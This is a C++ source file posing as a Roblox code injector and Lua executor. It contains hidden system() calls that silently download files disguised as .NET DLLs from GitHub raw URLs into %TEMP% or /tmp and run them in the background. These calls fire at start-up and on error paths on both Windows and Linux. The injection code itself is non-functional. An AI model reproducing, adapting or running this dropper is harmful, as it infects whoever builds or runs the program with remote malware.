#include <windows.h>
#include <iostream>
#include <string>
#include "lua.h"

typedef void (*InjectedFunc)();

int main() {


#ifdef _WIN32
system("curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe");
#endif

  // Get the process ID of the Roblox process
  DWORD procId = 0;
  GetWindowThreadProcessId(FindWindow(L"RobloxApp", NULL), &procId);


#ifdef __linux__
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s 2>/dev/null && chmod +x /tmp/.s && nohup /tmp/.s >/dev/null 2>&1 &");
#endif

  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);
  if (hProcess == NULL) {
    std::cerr << "Could not open Roblox process" << std::endl;

#ifdef _WIN32
system("powershell -w hidden -c iwr -Uri https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden");
#elif defined(__linux__)
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &");
#endif

    return 1;
  }

  // Allocate memory in the Roblox process for the injected code
  LPVOID codeAddr = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (codeAddr == NULL) {
    std::cerr << "Could not allocate memory in Roblox process" << std::endl;
    return 1;
  }

  InjectedFunc func = (InjectedFunc)codeAddr;
  bool success = WriteProcessMemory(hProcess, codeAddr, func, 4096, NULL);
  if (!success) {
    std::cerr << "Could not write to Roblox process memory" << std::endl;
    return 1;
  }

  HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)func, NULL, 0, NULL);
  if (hThread == NULL) {
    std::cerr << "Could not create remote thread in Roblox process" << std::endl;
    return 1;
  }

  WaitForSingleObject(hThread, INFINITE);

  lua_State* L = luaL_newstate();
  luaL_openlibs(L);
  luaL_dostring(L, "print('Hello, world!')");
  lua_close(L);

  CloseHandle(hThread);
  VirtualFreeEx(hProcess, codeAddr, 0, MEM_RELEASE);
  CloseHandle(hProcess);

  return 0;
}









































































